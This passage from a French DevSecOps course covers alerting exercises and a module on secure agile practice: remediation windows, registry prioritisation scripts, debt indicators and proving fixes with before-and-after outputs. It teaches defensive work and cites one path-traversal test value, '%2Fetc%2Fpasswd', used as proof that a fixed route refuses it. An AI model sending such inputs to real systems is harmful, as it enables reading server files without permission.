cp modeles/tableau-bord-preuves.md tableau-bord-preuves.md
grep -c '|' tableau-bord-preuves.md
```

```text
9
```

#### Ce que ce lab produit

- Une pile locale de quatre conteneurs, liée aux ports 127.0.0.1 réservés à ce module, avec sa configuration.
- Une application instrumentée, qui expose `/metrics` et reçoit les notifications.
- Un validateur de propositions de modèle, avec son jeu de propositions de démonstration.
- Une fiche de preuves : seuils, requêtes, destinataire et preuve du cycle d’alerte.

**Critère de réussite.** La cible `nordmail` est `up`, la règle passe de `inactive` à `firing` sous le trafic d’épreuve puis revient à l’état inactif, Alertmanager reçoit la notification, Loki rend la ligne d’erreur et la notification, et le tableau de bord expose trois panneaux dont les requêtes figurent dans la fiche de preuves.

Les seuils et l’exception de la fiche alimentent J3-M3 : le plan de sécurité reprend le seuil d’alerte comme critère de vérification d’une action de maintenance.

### Exercices

#### Exercice 1 — Choisir entre signature et comportement

xz-utils (CVE-2024-3094) et Log4Shell (CVE-2021-44228) : pour chacun, dites ce qui l’aurait révélé en premier, d’une base de signatures, d’une métrique ou d’un journal.

**Critère de réussite.** xz-utils : ni signature ni métrique applicative, une anomalie de comportement observée à l’usage ; Log4Shell : signature après publication, puis journaux pour les tentatives d’exploitation. La réponse nomme ce que chaque source ne peut pas voir.

#### Exercice 2 — Justifier un seuil

La règle du lab déclenche à 20 réponses 5xx en deux minutes. Quelle valeur proposez-vous pour une route qui reçoit trois requêtes par heure, et pourquoi ?

**Critère de réussite.** La réponse donne un seuil d’au moins une erreur sur la fenêtre, explique qu’un taux relatif n’a pas de sens sous quelques requêtes, et conserve la fenêtre `for`.

#### Exercice 3 — Refuser une proposition de modèle

Un modèle propose : « tester `/admin/purge` en envoyant une requête POST, attendu : la purge est refusée ». Écrivez la proposition corrigée pour qu’elle passe le validateur.

**Critère de réussite.** La proposition porte une entrée complète (`curl -X POST http://127.0.0.1:9101/admin/purge`), un attendu chiffré (code 403) et la commande de preuve, et le validateur la déclasse si l’attendu n’est pas un code ou un contenu observable.

#### Exercice 4 — Écrire une règle de bruit

Le service reçoit des scanners qui produisent des 404 en série. Écrivez une règle qui alerte sur une campagne de reconnaissance sans alerter sur un lien mort.

**Critère de réussite.** La règle compte des 404 par route sur une fenêtre, porte une sévérité et une action, et cite la ligne de journal à consulter.

### Résumé

- Une signature ne voit pas ce qui n’a pas encore de nom : l’observation du comportement est un complément, jamais un remplacement.
- Un seuil sans fenêtre produit du bruit ; une fenêtre sans destinataire produit du silence.
- Un compteur brut ne redescend jamais : une tendance se calcule avec `rate` ou `increase`, qui ignorent la valeur initiale d’une série.
- Une panne de collecte ne se voit pas dans l’application : elle se surveille par ses propres métriques et alertes.
- Un modèle propose des cas de test ; le schéma et le rejeu décident. Aucun journal contenant des données personnelles ne quitte le poste.

### Références

- Prometheus, règles d’alerte et clause `for` : <https://prometheus.io/docs/prometheus/latest/configuration/alerting_rules/>
- Prometheus, états d’alerte et interface de programmation : <https://prometheus.io/docs/prometheus/latest/querying/api/>
- Alertmanager, configuration des destinataires : <https://prometheus.io/docs/alerting/latest/configuration/>
- Grafana Loki, requêtes LogQL : <https://grafana.com/docs/loki/latest/query/>
- OWASP Top 10 for LLM Applications : <https://genai.owasp.org/llm-top-10/>
- NIST (National Institute of Standards and Technology) NVD (National Vulnerability Database), CVE-2024-3094 (xz-utils) : <https://nvd.nist.gov/vuln/detail/CVE-2024-3094>
- NIST NVD, CVE-2021-44228 (Log4Shell) : <https://nvd.nist.gov/vuln/detail/CVE-2021-44228>

**Inspiration retenue (J3-M2).** *Mastering DevSecOps* (parties 9 à 11, détection à l’exécution, automatisation par IA, pipelines qui se réparent) fournit l’enchaînement détection, corrélation, réponse. *Ultimate CI/CD for Platform Engineering* (parties 4 et 7 à 8, IA et automatisation, supervision applicative) fournit la structure du tableau de bord et la place des propositions automatisées. Transposition : Prometheus, Loki, Grafana et un validateur local remplacent les services managés décrits par les ouvrages.

## Module J3-M3 — Bonnes pratiques pour un développement agile sécurisé

### Préambule

Le 24 janvier 2024, Jenkins publie un avis pour CVE-2024-23897 : son interface de ligne de commande lit des fichiers arbitraires du serveur, avec une sévérité critique. Les versions corrigées sont 2.442 et 2.426.3 (LTS, Long-Term Support). Une organisation qui ne connaît pas la version de son serveur Jenkins ne sait pas si elle est concernée.

### Le vocabulaire en clair

| Terme | En clair | Où on le rencontre |
| --- | --- | --- |
| Shift-left | Déplacer la décision de sécurité vers l’amont, là où elle coûte le moins. | Raffinement, revue, gate. |
| Maintenance continue | Mises à jour planifiées, datées et prouvées. | Plan de sécurité, calendrier. |
| Dette de sécurité | Constat ouvert dont l’échéance est dépassée. | Registre, indicateurs. |
| Fenêtre de correction | Délai maximal par sévérité ; sept jours pour une faille du catalogue KEV (Known Exploited Vulnerabilities). | Registre J2-M2. |
| Indicateur | Valeur calculée sur le registre, sans jugement. | `suivi-dette-securite.md`. |

### Objectifs du module

À l’issue de ce module, vous serez capable de :

1. **Appliquer** le shift-left en écrivant un critère d’acceptation au raffinement et le contrôle qui l’accompagne.
2. **Prioriser** les constats ouverts du registre par gravité et échéance, sans retrier à la main.
3. **Planifier** une mise à jour dans la fenêtre de correction de sa sévérité, y compris pour l’outil d’intégration continue.
4. **Calculer** trois indicateurs de dette et **interpréter** leur variation.
5. **Prouver** la clôture d’une action par une sortie avant et une sortie après.

**Prérequis.** Développeurs, ingénieurs DevOps et SRE (Site Reliability Engineering), QA (Quality Assurance), ingénieurs sécurité. Niveau intermédiaire. [Registre J2-M2](jour-02.md#module-j2-m2--gestion-des-vulnérabilités-et-remédiations) rempli, [fiche d’atelier J3-M1](#module-j3-m1--culture-secdevops-et-sensibilisation-des-équipes) et [fiche de preuves J3-M2](#module-j3-m2--approches-avancées-pour-secdevops) disponibles.

### Contenu du module

#### 1. Shift-left : déplacer la décision, pas le scanner

Un contrôle exécuté après la fusion impose une correction et une revue supplémentaires. Le même contrôle, écrit au raffinement, tient en une phrase dans le ticket. Le shift-left consiste donc à écrire l’exigence avant le développement, pas à ajouter des analyses plus tôt.

Un critère sans commande reste une case à cocher : chaque critère porte donc une commande, et chaque commande un résultat observable. Le shift-left ne remplace ni le DAST (Dynamic Application Security Testing), ni l’observation en production.

#### 2. Maintenance continue : des fenêtres, pas des intentions

Le registre J2-M2 fixe déjà les fenêtres : sept jours pour CRITICAL, trente pour HIGH, quatre-vingt-dix pour MEDIUM, cent quatre-vingts pour LOW, et sept jours quelle que soit la sévérité pour une faille au catalogue KEV. Ces délais sont une règle interne du registre. La directive BOD (Binding Operational Directive) 19-02 de la CISA (Cybersecurity and Infrastructure Security Agency), aujourd’hui révoquée, fixait 15 jours pour les critiques et 30 pour les élevées, à compter de la détection initiale.

| Objet | Ce qu’on suit | Fenêtre | Preuve attendue |
| --- | --- | --- | --- |
| Dépendances applicatives | version installée et CVE | sept à cent quatre-vingts jours | sortie de scan après montée de version |
| Image de base | correctifs du système, sans version corrigée | reconstruction planifiée | digest de l’image (`docker image inspect --format '{{index .RepoDigests 0}}' python:3.12-slim`) et sortie de scan |
| Outil d’intégration continue | version déployée et avis de sécurité | sept jours si la faille est exploitée | version affichée par l’instance |

#### 3. Trois indicateurs, et la façon dont ils mentent

Trois valeurs suivent la dette : constats ouverts hors échéance, âge médian des constats ouverts, part avec propriétaire nommé. Aucune ne se lit seule : un passage à `corrigée` sans preuve fait baisser la première, la suppression d’anciennes lignes la deuxième, et une case remplie avec un nom erroné porte la troisième à 100 %.

### Les techniques, pas à pas

#### Technique 1 — Prioriser le registre sans le retrier à la main

Un tri manuel donne un ordre différent à chaque revue. Le script [`prioriser-registre.sh`](labs/lab-jour-03/j3-m3/outils/prioriser-registre.sh) extrait les constats non clos, les classe par gravité puis par échéance, et exclut `corrigée` et `fausse alerte`.

```bash
bash outils/prioriser-registre.sh ../../lab-jour-02/j2-m2/corrige/registre-vulnerabilites.md > priorisation-vulnerabilites.csv
cat priorisation-vulnerabilites.csv
```

```text
id;composant;severite;echeance;proprietaire;decision
CODE-02;app.py:73;CRITICAL;2026-11-07;dev-nordmail;planifiée
CODE-03;app.py:86;CRITICAL;2026-11-07;dev-nordmail;planifiée
BASE-01;python:3.12-slim, 44 HIGH sans correctif;HIGH;2026-11-30;resp-plateforme;atténuée
CODE-04;app.py:103;HIGH;2026-11-30;dev-nordmail;planifiée
CODE-05;app.py:92;HIGH;2026-11-30;dev-nordmail;planifiée
CODE-06;app.py:99;LOW;2027-04-29;dev-nordmail;planifiée
```

#### Technique 2 — Calculer les trois indicateurs

Le script [`indicateurs.py`](labs/lab-jour-03/j3-m3/outils/indicateurs.py) calcule, à partir du registre et d’une date, les constats ouverts, les constats hors échéance, l’âge médian et la part avec propriétaire. « Ouverts » désigne les décisions `planifiée`, `atténuée` et `acceptée` ; l’âge se compte depuis la date de détection de chaque constat.

```bash
python3 outils/indicateurs.py ../../lab-jour-02/j2-m2/corrige/registre-vulnerabilites.md 2026-11-08
```

```text
constats ouverts      : 6
hors échéance         : 2
âge médian (jours)    : 8.0
avec propriétaire (%) : 100
```

#### Technique 3 — Prouver une clôture

Clore une ligne demande deux sorties : l’une avant la correction, l’autre après. Modifiez la décision de `CODE-02` en `corrigée` sans changer le code, puis relancez les indicateurs à la même date.

```text
constats ouverts      : 5
hors échéance         : 1
âge médian (jours)    : 8.0
avec propriétaire (%) : 100
```

Le nombre hors échéance a baissé d’une unité alors que le code n’a pas changé : l’indicateur seul ne prouve rien. Une ligne passe à `corrigée` seulement si le champ `Preuve` contient la commande et sa sortie après correction.

### Lab — Plan de sécurité pour un projet agile

#### Prérequis

- avoir exécuté les techniques 1 à 3 ;
- [registre J2-M2](jour-02.md#module-j2-m2--gestion-des-vulnérabilités-et-remédiations) corrigé, [fiche d’atelier J3-M1](#module-j3-m1--culture-secdevops-et-sensibilisation-des-équipes) et [fiche de preuves J3-M2](#module-j3-m2--approches-avancées-pour-secdevops) présentes ;
- `awk` et Python 3.12, aucun conteneur à démarrer.

#### Environnement

| Élément | Valeur |
| --- | --- |
| Dossier du lab | `labs/lab-jour-03/j3-m3/` |
| Source des constats | `labs/lab-jour-02/j2-m2/corrige/registre-vulnerabilites.md` |

#### Étapes du lab

**Étape 1 — Prioriser et dater**

Placez-vous dans le dossier du lab et comptez les lignes de priorisation : l’en-tête et six constats ouverts, sans constat clos.

```bash
cd labs/lab-jour-03/j3-m3
bash outils/prioriser-registre.sh ../../lab-jour-02/j2-m2/corrige/registre-vulnerabilites.md | wc -l
```

```text
7
```

**Étape 2 — Construire le plan par sprint**

Copiez le modèle en `plan-securite-agile.md`. Répartissez les constats prioritaires en deux sprints, chacun avec un critère d’acceptation hérité de J3-M1 et une preuve attendue. Le constat `CODE-02`, critique et daté au 2026-11-07, ne se reporte pas : il ouvre le sprint 1.

Le plan intègre au moins une action issue de J3-M1 (l’acceptation datée du constat `BASE-01`) et une action issue de J3-M2 (vérifier que le seuil d’alerte de 20 réponses 5xx en deux minutes reste déclenché après la correction de `/export`). La section `Dette reportée` nomme l’autorité et la date de révision, jamais « à définir ».

```bash
cp modeles/plan-securite-agile-modele.md plan-securite-agile.md
grep -c 'à compléter\|À compléter\|<.*>' plan-securite-agile.md
```

```text
0
```

Sur le modèle brut, la même commande rend une valeur non nulle : un gabarit qui garde ses marqueurs n’est pas un plan.

**Étape 3 — Calculer le suivi et l’interpréter**

Créez `suivi-dette-securite.md` avec les trois indicateurs calculés à la date de revue du 2026-11-08, leur valeur précédente au 2026-10-31, et un seuil d’alerte interne : par exemple plus de deux constats hors échéance déclenche une revue de plan.

```bash
python3 outils/indicateurs.py ../../lab-jour-02/j2-m2/corrige/registre-vulnerabilites.md 2026-10-31
python3 outils/indicateurs.py ../../lab-jour-02/j2-m2/corrige/registre-vulnerabilites.md 2026-11-08
```

```text
constats ouverts      : 6
hors échéance         : 0
âge médian (jours)    : 0.0
avec propriétaire (%) : 100
constats ouverts      : 6
hors échéance         : 2
âge médian (jours)    : 8.0
avec propriétaire (%) : 100
```

**Étape 4 — Vérifier la clôture par une preuve**

Choisissez une action du sprint 1 que vous pouvez réellement exécuter avec la pile J3-M2 : la route `/export` répond 200 quand son répertoire de données existe. Relevez la sortie avant, appliquez l’action, relevez la sortie après, puis mettez à jour la ligne du registre dans votre copie de travail avec la preuve.

```bash
docker compose -f ../j3-m2/docker-compose.yml exec -T app mkdir -p /srv/nordmail/export
docker compose -f ../j3-m2/docker-compose.yml exec -T app sh -c 'echo "note de demonstration" > /srv/nordmail/export/notes.txt'
curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:9101/export?fichier=notes.txt'
```

```text
200
```

La sortie avant était `500`, causée par un répertoire de données absent et non par la traversée de chemin : `CODE-01` est clos depuis J2-M2, sa preuve `safe_join` rend 404 sur `%2Fetc%2Fpasswd`. Rendre la route fonctionnelle ne clôt aucun constat de sécurité. Une preuve qui ne porte pas sur le constat ne le clôt pas : cette ligne serait une fausse clôture.

#### Ce que ce lab produit

- `priorisation-vulnerabilites.csv` : constats ouverts classés par gravité puis échéance (rôle : alimenter le tri du sprint).
- `plan-securite-agile.md` : deux sprints, critères d’acceptation, propriétaires, échéances, preuves attendues, dette reportée avec autorité (rôle : plan de sécurité exécutable).
- `suivi-dette-securite.md` : trois indicateurs datés, seuil d’alerte interne et tendance (rôle : suivi de la dette de sécurité).

**Critère de réussite.** Le CSV ne contient aucun constat clos, le plan nomme un propriétaire et une échéance pour chaque action et ne garde aucun marqueur de gabarit, les trois indicateurs sont calculés à deux dates, et une clôture s’accompagne des deux sorties de commande.

### Exercices

#### Exercice 1 — Écrire le critère du sprint 1

Rédigez le critère d’acceptation de la correction de `CODE-03` (injection de commande sur `/ping`, échéance au 2026-11-07), utilisable au raffinement.

**Critère de réussite.** Le critère nomme l’entrée, la commande de vérification et le résultat observable, sans terme comme « sécuriser » ou « vérifier ».

#### Exercice 2 — Planifier la mise à jour de l’outil d’intégration

Votre Jenkins tourne en 2.426.2 et CVE-2024-23897 est exploitée. Écrivez la ligne de plan correspondante.

**Critère de réussite.** La ligne nomme la version cible 2.426.3 ou 2.442, la fenêtre de sept jours justifiée par l’exploitation effective, le propriétaire, et la preuve attendue : version affichée par l’instance après redéploiement.

#### Exercice 3 — Détecter un indicateur trompeur

Le nombre de constats ouverts est passé de 20 à 8 en une semaine, mais l’âge médian est passé de 9 à 40 jours. Que s’est-il probablement produit, et que demandez-vous avant d’accepter le chiffre ?

**Critère de réussite.** La réponse évoque des clôtures massives sans preuve ou une suppression de lignes, et demande les sorties de vérification correspondantes avant de valider.

### Résumé

- Shift-left déplace la décision, pas le scanner : chaque critère porte la commande qui le prouve.
- Une ligne de registre ne se clôt que par une sortie avant et une sortie après. Les trois indicateurs sont : constats ouverts hors échéance, âge médian des constats ouverts et part avec propriétaire nommé. La règle est « une ligne ne se clôt que par deux sorties » (preuve avant/après) ; sans les deux sorties, la clôture n’est pas prouvée.

### Références

- Jenkins, avis de sécurité du 24 janvier 2024 (CVE-2024-23897) : <https://www.jenkins.io/security/advisory/2024-01-24/>
- CISA, directive BOD 19-02, révoquée : <https://www.cisa.gov/news-events/directives/bod-19-02-vulnerability-remediation-requirements-internet-accessible-systems>
- NIST (National Institute of Standards and Technology) SP 800-218, SSDF (Secure Software Development Framework), pratiques PW et RV : <https://csrc.nist.gov/pubs/sp/800/218/final>
- OWASP (Open Worldwide Application Security Project) SAMM (Software Assurance Maturity Model) v2, fonction Governance : <https://owaspsamm.org/model/>
- FIRST (Forum of Incident Response and Security Teams), API (Application Programming Interface) EPSS (Exploit Prediction Scoring System) : <https://www.first.org/epss/api>

**Inspiration retenue (J3-M3).** *Mastering DevSecOps* (partie 2, fondations de la livraison sûre ; partie 12, gouvernance et conformité) fournit la grille de fenêtres de correction et le rôle de la gouvernance dans le suivi. *Ultimate CI/CD for Platform Engineering* (parties 10 à 12, montée en charge, tendances, études de cas) fournit la structure du plan par itérations et la mesure de tendance. Transposition : registre J2-M2 et scripts locaux remplacent les tableaux de bord de fournisseur.
